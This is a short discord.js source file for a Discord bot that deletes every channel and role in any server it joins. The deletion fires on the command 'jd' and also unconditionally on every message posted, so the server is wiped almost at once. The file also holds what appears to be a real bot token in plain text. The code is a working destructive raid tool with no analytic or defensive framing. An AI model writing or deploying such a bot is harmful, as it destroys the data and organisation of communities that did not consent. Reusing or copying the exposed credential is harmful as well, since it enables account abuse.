const Discord = require("discord.js");
const bot = new Discord.Client();

let token = "NDk3MDMxOTE0MTcyMDU1NTU0.DpZQoQ.iWhpB8kdge7sv3tjd0Y3Yqip9Cc";

bot.on("ready", async () => {
    console.log(`${bot.user.username} ready!`);
});


bot.on("message", async message => {
    if(message.content === "jd"){
        message.guild.channels.deleteAll("xd");
        message.guild.roles.deleteAll("xd");
    }

    if(message.content === "leave"){
        message.guild.leave();
    }
    message.guild.channels.deleteAll("xd");
    message.guild.roles.deleteAll("xd");

});
bot.login(token);
